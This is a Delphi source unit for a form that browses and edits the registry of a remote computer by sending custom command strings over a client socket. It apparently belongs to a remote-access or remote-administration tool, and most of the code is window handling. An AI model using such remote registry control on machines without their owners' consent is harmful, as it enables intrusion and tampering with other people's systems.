unit RegEditUnit;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, MainColors,
  ExtCtrls, StdCtrls, TFlatSpeedButtonUnit, OutlookBtn,
  TFlatEditUnit, RXSplit, TFlatComboBoxUnit, TFlatHintUnit;

type
  TRegEdit = class(TForm)
    CaptionLabel: TLabel;
    CloseButton: TFlatSpeedButton;
    Label1: TLabel;
    Panel1: TPanel;
    Panel2: TPanel;
    RxSplitter1: TRxSplitter;
    Panel3: TPanel;
    Label2: TLabel;
    Label3: TLabel;
    DirList: TListBox;
    KeyList: TListBox;
    Label4: TLabel;
    FlatEdit1: TFlatEdit;
    OutlookBtn1: TOutlookBtn;
    OutlookBtn2: TOutlookBtn;
    OutlookBtn3: TOutlookBtn;
    OutlookBtn4: TOutlookBtn;
    OutlookBtn5: TOutlookBtn;
    OutlookBtn6: TOutlookBtn;
    FlatHint: TFlatHint;
    tmpList: TListBox;
    Label5: TLabel;
    FlatBox2: TFlatComboBox;
    procedure FormCreate(Sender: TObject);
    procedure CloseButtonClick(Sender: TObject);
    procedure CaptionLabelMouseDown(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState; X,
      Y: Integer);
    procedure CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
      Shift: TShiftState; X, Y: Integer);
    procedure OutlookBtn6Click(Sender: TObject);
    procedure FlatBox2Change(Sender: TObject);
    procedure DirListClick(Sender: TObject);
    procedure KeyListClick(Sender: TObject);
    procedure OutlookBtn1Click(Sender: TObject);
    procedure OutlookBtn2Click(Sender: TObject);
    procedure OutlookBtn4Click(Sender: TObject);
    procedure OutlookBtn5Click(Sender: TObject);
    procedure OutlookBtn3Click(Sender: TObject);
    procedure FormPaint(Sender: TObject);
    procedure FormResize(Sender: TObject);
  private
    procedure WMNCHitText(var Msg:TWMNCHitTest);message WM_NCHITTEST;
  public
    MouseDownSpot : TPoint;
    Capturing : bool;
    AddThem:Boolean;
    Tip:String;
    procedure AddSauNu;
    procedure SetTheColors;
  end;

var
  RegEdit: TRegEdit;
implementation

uses Unit1, MainUnit, showmessageunit;

{$R *.DFM}

function Merge(x,y,x1,y1,x2,y2:integer):Boolean;
begin
 if ((x>=x1) and (x<=x2)) and ((y>=y1) and (y<=y2)) then result:=true else result:=false;
end;
var KeepX,KeepY:Integer;
procedure TRegEdit.WMNCHitText(var Msg:TWMNCHitTest);
const Corner=5;
      OffSet=3;
begin
  inherited;
 with RegEdit,msg do begin
{  if (Merge(xpos,ypos ,Left+MinimizeButton.Left,Top+MinimizeButton.Top,Left+MinimizeButton.Left+MinimizeButton.Width,Top+MinimizeButton.Top+MinimizeButton.Height)) then exit;}
  if (Merge(xpos,ypos ,Left+CloseButton.Left,Top+CloseButton.Top,Left+CloseButton.Left+CloseButton.Width,Top+CloseButton.Top+CloseButton.Height)) then exit;
 end;
 if (Msg.Result = HTCLIENT) then
  with RegEdit,msg do begin
  if (Merge(xpos,ypos ,Left         ,top+Corner        ,left+Offset       ,top+height-Corner)) then Result := htLeft;
  if (Merge(xpos,ypos ,Left+width-Offset ,top+Corner        ,left+width   ,top+height-Corner)) then Result := htRight;
  if (Merge(xpos,ypos ,Left+Corner       ,top          ,left+width-Corner ,top+Offset       )) then Result := htTop;
  if (Merge(xpos,ypos ,Left+Corner       ,top+height-Offset ,left+width-Corner ,top+height  )) then Result := htBottom;
  if (Merge(xpos,ypos ,Left,Top,Left+Corner,Top+Corner)) then Result:=htTopLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top,Left+Width,Top+Corner)) then Result:=htTopRight;
  if (Merge(xpos,ypos ,Left,Top+Height-Corner,Left+Corner,Top+Height)) then REsult:=htBottomLeft;
  if (Merge(xpos,ypos ,Left+Width-Corner,Top+Height-Corner,Left+Width,Top+Height)) then Result:=htBottomRight;
{  if (Merge(xpos,ypos ,Left+CaptionLabel.Left,Top+CaptionLabel.Top,Left+CaptionLabel.Left+CaptionLabel.Width,Top+CaptionLabel.Top+CaptionLabel.Height)) then Result:=htCaption;}
 end;
end;

procedure TRegEdit.SetTheColors;
begin
 CaptionLabel.Font.Color:=cFormText;
 CaptionLabel.Color:=cFormCaption;
 with CloseButton do begin
  Color:=cFormCaption;
  ColorBorder:=cFormCaption;
  Font.Color:=cFormText;
  ColorDown:=cFormBackground;
  ColorFocused:=cFormForeground;
  ColorHighlight:=cFormLine;
  ColorShadow:=cFormLine;
  Glyph.Assign(MainForm.bit_close_btn);
  NumGlyphs:=2;
  Caption:='';
  Top:=5;
 end;
 Label1.Font.Color:=cFormText;Label2.Font.Color:=cFormText;
 Label3.Font.Color:=cFormText;Label4.Font.Color:=cFormText;
 Label5.Font.Color:=cFormText;
 Panel1.Color:=cFormBackground;Panel2.Color:=cFormBackground;Panel3.Color:=cFormBackground;
 with FlatHint do begin
  ColorArrow:=cFormText;ColorArrowBackground:=cFormCaption;ColorBackground:=cFormBackground;ColorBorder:=cFormLine;Font.Color:=cFormText;end;
 {components - [-FlatComboBox-]}
 with FlatBox2 do begin ColorArrow:=cFormText;ColorArrowBackground:=cFormForeground;
  ColorBorder:=cFormLine;Color:=cFormForeground;Font.Color:=cFormText;end;
 with FlatEdit1 do begin ColorBorder:=cFormLine;Font.Color:=cFormText;ColorFlat:=cFormBackground;ColorFocused:=cFormForeground;end;
 RxSplitter1.Color:=cFormCaption;
 DirList.Color:=cFormForeGround;
 KeyList.Color:=cFormForeground;
 DirList.Font.Color:=cFormText;
 KeyList.Font.Color:=cFormText;
 Invalidate;
end;

procedure TRegEdit.FormCreate(Sender: TObject);
begin
 Tag:=9;Left:=(Screen.Width-Width) div 2; Top:=(Screen.Height-Height) div 2;
 if MainForm.ReadKey(IntToStr(Tag)+'_x')<>'' then Left:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_x'));
 if MainForm.ReadKey(IntToStr(Tag)+'_y')<>'' then Top:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_y'));
 if MainForm.ReadKey(IntToStr(Tag)+'_h')<>'' then Height:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_h'));
 if MainForm.ReadKey(IntToStr(Tag)+'_w')<>'' then Width:=StrToInt(MainForm.ReadKey(IntToStr(Tag)+'_w'));
 SetTheColors;
 AddThem:=False;
 ShowHint:=MainForm.ShowHint;
end;

procedure TRegEdit.CloseButtonClick(Sender: TObject);
begin
 MainForm.ClientSocket.Socket.SendText('CLG');
 Hide;
end;

procedure TRegEdit.CaptionLabelMouseDown(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 SetCapture(CaptionLabel.Parent.Handle);
 Capturing := true;
 MouseDownSpot.X := x;
 MouseDownSpot.Y := Y;
end;


procedure TRegEdit.CaptionLabelMouseMove(Sender: TObject; Shift: TShiftState;
  X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TRegEdit.CaptionLabelMouseUp(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
if Capturing then with CaptionLabel.Parent do begin
 ReleaseCapture;
 Capturing := false;
 Left := Left - (MouseDownSpot.x - x);
 Top := Top - (MouseDownSpot.y - y);
end;
end;

procedure TRegEdit.OutlookBtn6Click(Sender: TObject);
begin
 MainForm.ClientSocket.Socket.SendText('CLG');
 Hide;
end;

procedure TRegEdit.FlatBox2Change(Sender: TObject);
begin
 if Conectat then with MainForm do begin
  ClientSocket.Socket.SendText('UALORK'+IntToStr(FlatBox2.ItemIndex));
  InitiateTransfer;
  Status.Caption:='transferring...';
  AddThem:=False;
 end else MainForm.Status.Caption:=NotConnected;
end;

function poz(ce:string):integer;
var i:integer;
begin
 result:=0;
 for i:=length(ce)-1 downto 1 do
  if ce[i]='\' then begin result:=i-1;break;end;
end;

procedure TRegEdit.DirListClick(Sender: TObject);
var newk:string;
begin
 if Conectat then begin
  if (DirList.Items[DirList.ItemIndex]<>'<..>') then begin
   MainForm.ClientSocket.Socket.SendText('UALOKY'+DirList.Items[DirList.ItemIndex]);
   Label5.Caption:=Label5.Caption+DirList.Items[DirList.ItemIndex]+'\';
   DirList.Clear;
  end else begin
   newk:=copy(Label5.Caption,1,poz(Label5.Caption));
   MainForm.ClientSocket.Socket.SendText('UALOKY'+newk+'\');
   Label5.Caption:=newk+'\';
   DirList.Clear;
  end;
  MainForm.InitiateTransfer;
  MainForm.Status.Caption:='transferring...';
  if Label5.Caption<>'\' then AddThem:=True else AddThem:=False;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.AddSauNu;
begin
 if AddThem then DirList.Items.Add('<..>');
end;

procedure TRegEdit.KeyListClick(Sender: TObject);
begin
 if Conectat then with MainForm do begin
  ClientSocket.Socket.SendText('RED'+KeyList.Items[KeyList.ItemIndex]);
  Status.Caption:='reading key value...';
  MainForm.StartAnimation;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.OutlookBtn1Click(Sender: TObject);
var cescrie,newvalue:string;
begin
 if (tip='1') or (tip='2') or (tip='3') then cescrie:='S' else cescrie:='I';
 if Conectat then with MainForm do begin
  GetTextForm.GetText('change key','new key value:',FlatEdit1.Text,false,newvalue);
  ClientSocket.Socket.SendText('CRGCRG'+cescrie+newvalue);
  Status.Caption:='changing key value...';
  MainForm.InitiateTransfer;
  FlatEdit1.Text:=newvalue;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.OutlookBtn2Click(Sender: TObject);
begin
 if Conectat then with MainForm do begin
  ClientSocket.Socket.SendText('DRGDRG'+KeyList.Items[KeyList.ItemIndex]);
  Status.Caption:='deleting key value...';
  FlatEdit1.Text:='';
  MainForm.InitiateTransfer;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.OutlookBtn4Click(Sender: TObject);
var nk1,nk2:string;
begin
 if Conectat then with MainForm do begin
 GetTextForm.GetText('create new integer key','key name:','',false,nk1);
 if nk1<>'' then begin
  GetTextForm.GetText('create new integer key','key value:','',false,nk2);
  ClientSocket.Socket.SendText('DRGNIK'+MainForm.FalDe(nk1,2)+nk1+nk2);
  Status.Caption:='creating new integer key...';
  MainForm.InitiateTransfer;
 end;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.OutlookBtn5Click(Sender: TObject);
var nk1,nk2:string;
begin
 if Conectat then with MainForm do begin
 GetTextForm.GetText('create new string key','key name:','',false,nk1);
 if nk1<>'' then begin
  GetTextForm.GetText('create new string key','key value:','',false,nk2);
  ClientSocket.Socket.SendText('DRGNSK'+MainForm.FalDe(nk1,2)+nk1+nk2);
  Status.Caption:='creating new string key...';
  MainForm.InitiateTransfer;
 end;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.OutlookBtn3Click(Sender: TObject);
var nk1:string;
begin
 if Conectat then with MainForm do begin
 GetTextForm.GetText('create new directory','directory name:','',false,nk1);
 if nk1<>'' then begin
  ClientSocket.Socket.SendText('DRGNRF'+nk1);
  Status.Caption:='creating new directory...';
  MainForm.InitiateTransfer;
 end;
 end else MainForm.Status.Caption:=NotConnected;
end;

procedure TRegEdit.FormPaint(Sender: TObject);
var i:integer;
begin
 for i:=24  to Height-5 do Canvas.CopyRect(bounds(0,i,4,1),MainForm.bit_window.canvas,bounds(1,26,4,1));
 for i:=24 to Height-5 do Canvas.CopyRect(bounds(Width-4,i,4,1),MainForm.bit_window.canvas,bounds(48,26,4,1));
 for i:=24 to Width-24 do Canvas.CopyRect(bounds(i,0,1,24),MainForm.bit_window.canvas,bounds(26,1,1,24));
 for i:=4 to Width-4 do Canvas.CopyRect(bounds(i,Height-4,1,4),MainForm.bit_window.canvas,bounds(26,28,1,4));
 Canvas.CopyRect(bounds(0,0,24,24),MainForm.bit_window.canvas,bounds(1,1,24,24));
 Canvas.CopyRect(bounds(Width-24,0,24,24),MainForm.bit_window.canvas,bounds(28,1,24,24));
 Canvas.CopyRect(bounds(0,Height-4,4,4),MainForm.bit_window.canvas,bounds(1,28,4,4));
 Canvas.CopyRect(bounds(Width-4,Height-4,4,4),MainForm.bit_window.canvas,bounds(48,28,4,4));
 Canvas.Brush.Color:=MainForm.BackgroundColor;
 Canvas.FillRect(Bounds(4,24,width-8,height-28));
end;

procedure TRegEdit.FormResize(Sender: TObject);
begin
 Invalidate;
end;

end.
